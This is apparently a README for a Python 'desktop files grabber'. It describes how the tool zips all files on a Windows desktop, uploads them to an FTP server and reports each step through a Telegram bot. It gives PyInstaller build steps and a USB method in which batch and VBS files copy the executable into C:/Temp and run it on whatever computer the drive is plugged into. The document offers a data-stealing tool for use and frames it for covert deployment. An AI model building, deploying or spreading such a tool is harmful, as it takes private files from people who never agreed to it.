# Simple desktop files grabber with alerts from Telegram Bot

This script grabbers all of `C:/User/Desktop`'s files and uploads them to FTP-server as `.zip` archive.

### Python modules used: (not built-in)
- [requests](pypi.org/project/requests) - 2.27.1
- [tqdm](pypi.org/project/requests) - 4.62.3
- [pytz](pypi.org/project/requests) - 2021.3
- [pyinstaller](pypi.org/project/pyinstaller) - 5.2

### Configure:
- Rename `config.py.example` to `config.py`
- Set values for `Bot` (`bot_config`) and `FTP` (`ftp_config`)

### Build:
Run `build.bat` file to build (it calls `pyinstaller`).
If the build ends, folders `build` and `dist` will appear.
Your built `main.exe` application will be in `dist/main` folder.
> Recommended to build in new local virtual environment.
> In my case `pyinstaller` copied some of installed libraries and built application's folder weight was ~100 MB, after using virtual environment the weight decreased up to ~8 MB.

### Start built application:
To start your built application run `main.exe` in `dist/main` folder.
> Built application (`main.exe`) needs all files and folders in `dist/main`!

### Messages from bot:
```
- [⭐️] #00000000_0000_0000_0000_000000000000 creating archive ...
- [🕹] #00000000_0000_0000_0000_000000000000 archive created
- [💭] #00000000_0000_0000_0000_000000000000 uploading as `00000000_0000_0000_0000_000000000000 01.01.2022 00:00:01.zip` ...
- 100%|██████████| 1M/1M [00:01<00:00, 2MiB/s]
- [❌] #00000000_0000_0000_0000_000000000000 error while uploading `00000000_0000_0000_0000_000000000000 01.01.2022 00:00:01.zip` - PYTHON_EXCEPTION
- [✅] #00000000_0000_0000_0000_000000000000 `00000000_0000_0000_0000_000000000000 01.01.2022 00:00:01.zip` uploaded
```

### From USB:
If you want to share your built application (`dist/main`) via USB, I added `main.bat` and `main.vbs` files.
When USB connected, run `main.bat`.
It just copies all of USB's `g/` folder to `C:/Temp/g/` and starts `main.exe` in new thread (doesn't depend on `main.bat`).
`main.bat`'s window will automatically close itself, if `main.exe` started.
> To share your built application you need to copy `dist/main` folder as `g` folder and copy `main.bat` and `main.vbs` to USB.
> To start copying files to connected computer start `main.bat`.
